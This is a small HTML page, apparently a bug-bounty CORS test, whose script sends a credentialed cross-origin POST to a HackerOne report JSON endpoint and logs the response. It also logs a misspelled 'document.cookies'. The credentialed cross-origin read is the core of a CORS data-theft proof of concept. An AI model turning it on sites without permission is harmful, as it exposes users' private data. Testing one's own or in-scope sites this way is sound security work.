<!DOCTYPE html>
<html>
<head>
  <title>CORS Test - REST Endpoint</title>
</head>
<body>
<script>
  // URL of the endpoint
  const url = "https://hackerone.com/reports/3295863.json";
console.log(document.cookies,"cookies")
  // Create XMLHttpRequest
  const xhr = new XMLHttpRequest();
  xhr.open('POST', url, true);
  xhr.withCredentials = true; // include cookies for authentication

  xhr.onload = function() {
    if (xhr.status >= 200 && xhr.status < 300) {
      console.log("Response from server:", xhr.responseText);
    } else {
      console.warn("Request failed with status:", xhr.status, xhr.statusText);
    }
  };

  xhr.onerror = function() {
    console.error("Network error or CORS blocked the request");
  };

  // Send the request
  xhr.send();
</script>
  <h1>cors test page</h1>
</body>
</html>
